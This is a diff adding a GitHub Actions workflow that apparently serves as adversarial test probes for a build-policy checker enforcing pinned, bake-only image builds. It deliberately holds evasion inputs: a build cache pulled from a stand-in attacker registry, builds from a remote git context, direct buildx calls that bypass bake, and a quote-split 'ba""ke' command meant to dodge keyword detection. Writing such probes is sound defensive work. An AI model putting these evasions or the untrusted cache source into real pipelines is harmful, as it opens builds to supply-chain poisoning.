@@ -1,0 +1,41 @@
+# Round-4 probes on a compliant job: a foreign cache (A cachefrom), image
+# builds that do not go through bake (A bpa, A buildxbuild; B W1, W3),
+# and a remote reusable workflow that builds (A reusable).
+on: pull_request
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-24.04
+    env:
+      BAKE_TARGET: postfix
+      PLATFORM: linux/amd64
+      BAKE_SET: |
+        postfix.cache-from=type=registry,ref=registry.invalid/attacker/cache:latest
+    steps:
+      - run: go run ./tools/check-image-pins -build "$BAKE_TARGET" -build-set "$BAKE_SET"
+      - id: build
+        uses: docker/bake-action@59cb1203cd42bcefd40a1b6d73b589e48c86040e # v7.5.0
+        with:
+          source: .
+          targets: ${{ env.BAKE_TARGET }}
+          load: true
+          set: ${{ env.BAKE_SET }}
+      - uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
+        with:
+          file: build.txt
+          build-contexts: base=docker-image://debian:trixie-slim
+      - run: docker buildx build --build-context base=docker-image://debian:trixie-slim -f build.txt https://example.invalid/repo.git#main
+      - run: docker buildx build --load -f build.txt -t ghcr.io/keepia/mail-postfix:dev .
+      - run: docker buildx ba""ke --load --file=m.txt postfix
+      - env:
+          BAKE_METADATA: ${{ steps.build.outputs.metadata }}
+        run: go run ./tools/check-image-pins -verify-built
+      - run: make image-test IMAGE=postfix
+  remote:
+    permissions:
+      contents: read
+    uses: docker/github-builder/.github/workflows/bake.yml@0123456789abcdef0123456789abcdef01234567 # v1.0.0
+    with:
+      context: https://example.invalid/repo.git
+      set: "*.contexts.base=docker-image://debian:trixie-slim"
